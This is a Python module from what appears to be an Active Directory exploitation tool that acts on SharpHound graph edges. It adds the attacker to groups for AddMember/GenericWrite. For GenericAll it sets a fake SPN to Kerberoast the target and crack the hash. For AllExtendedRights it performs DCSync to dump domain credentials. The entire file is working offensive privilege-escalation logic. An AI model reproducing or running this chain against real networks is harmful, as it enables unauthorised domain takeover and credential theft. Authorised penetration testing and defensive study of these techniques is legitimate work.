"""Handlers for standard SharpHound edges used in the exploitation chain."""

import logging

from .shared import PrivescActions


class StandardModule:
    def __init__(self, engine):
        self.engine = engine
        self.actions = PrivescActions(engine)

    # AddMember / GenericWrite / GenericAll / AllExtendedRights are standard privilege abuse.
    def execute(self, rel, context) -> bool:
        edge_type = rel.type
        target_dn, target_name = self.actions.resolve_target(rel)

        if not target_dn:
            logging.error(f"STANDARD: could not resolve distinguishedname for {edge_type}.")
            return False

        if edge_type in ("AddMember", "GenericWrite"):
            current_user_dn = self.engine.conn.user
            if not current_user_dn:
                logging.error("STANDARD: no current LDAP identity available for group membership.")
                return False

            success = self.actions.add_group_member(target_dn, current_user_dn)
            if not success:
                return False

            # Force a fresh bind so newly granted group rights are reflected.
            current_auth = context.get_current_auth()
            current_password = current_auth.get("value")
            current_username = current_auth.get("username")
            if current_username and current_password:
                if not self.engine.conn.rebind(user=current_username, password=current_password):
                    logging.error("STANDARD: rebind failed after group membership change.")
                    return False

            return True

        if edge_type == "GenericAll":
            spn_value = "viper/roasted"
            if not self.actions.set_fake_spn(target_dn, spn_value):
                return False

            current_auth = context.get_current_auth()
            current_password = current_auth.get("value")
            if not current_password:
                logging.error("STANDARD: no current password available for Kerberoast request.")
                return False

            hash_value = self.actions.request_kerberoast_hash(target_name, spn_value, current_password)
            if not hash_value:
                return False

            return self.actions.persist_hash_and_maybe_crack(hash_value, target_name, spn_value)

        if edge_type == "AllExtendedRights":
            current_auth = context.get_current_auth()
            current_password = current_auth.get("value")
            if not current_password:
                logging.error("STANDARD: no current password available for AllExtendedRights.")
                return False
            return self.actions.dcsync(current_password)

        logging.info(f"STANDARD: {edge_type} -> {target_name}; no direct exploit mapped yet.")
        return True
